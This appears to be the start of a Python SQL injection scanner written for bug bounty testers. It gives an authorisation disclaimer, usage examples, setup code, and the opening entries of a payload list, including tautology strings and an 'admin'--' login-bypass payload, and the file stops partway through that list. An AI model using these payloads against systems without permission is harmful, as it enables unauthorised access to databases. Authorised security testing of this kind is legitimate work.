#!/usr/bin/env python3
"""
SQL Injection Scanner
by a bug bounty hunter, for bug bounty hunters and cyber security professionals

Only use this on targets you own or have written permission to test.
(e.g., Authorized Bug Bounty Programs).

Usage:
    python sqli_scanner.py -u "https://target.com/page?id=1" --level 2
    python sqli_scanner.py -u "https://target.com/login" --method POST --data "user=admin&pass=x"
    python sqli_scanner.py -u "https://target.com/profile?id=1" --cookies "session=abc" --level 3 --out report.txt

COMMON ISSUE - no results?
    Almost always a session/cookie problem, or no parameters to test.
    The scanner might be hitting a login page instead of the real app. Fix:
      1. Log into the target in your browser
      2. Open DevTools -> Application/Storage -> Cookies
      3. Copy your session cookie value
      4. Run with: --cookies "session=<value>"
      5. Run with --debug to see exactly what the scanner is receiving
"""

import requests
import argparse
import sys
import time
import re
from urllib.parse import urlparse, urlencode, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime


# Silence SSL warnings - we often test local apps with self-signed certs
requests.packages.urllib3.disable_warnings()


# -----------------------------------------------------------------------------
#  PAYLOADS
#  Grouped by what they do and how deep (level 1, 2, or 3).
#  Level 1 = quick and safe, Level 3 = slow but thorough.
# -----------------------------------------------------------------------------

PAYLOADS = [
    # --- Classic / boolean stuff (level 1) ---
    # These are the first things any pentester tries.
    # A single quote breaks most poorly written queries right away.
    ("'",                        1, "classic",    "single quote - breaks SQL string context"),
    ('"',                        1, "classic",    "double quote variant"),
    ("1' OR '1'='1",             1, "classic",    "always-true OR condition"),
    ("1' OR '1'='1'--",          1, "classic",    "OR bypass with comment"),
    ("' OR 1=1--",               1, "classic",    "integer OR bypass"),
    ("' OR 1=1#",                1, "classic",    "MySQL hash comment version"),
    ("admin'--",                 1, "classic",    "login bypass - comments out password check"),
    ("1 OR 1=1",                 1, "classic",    "no-quote version for numeric params"),
    ("' OR 'x'='x",              1, "classic",    "string tautology"),

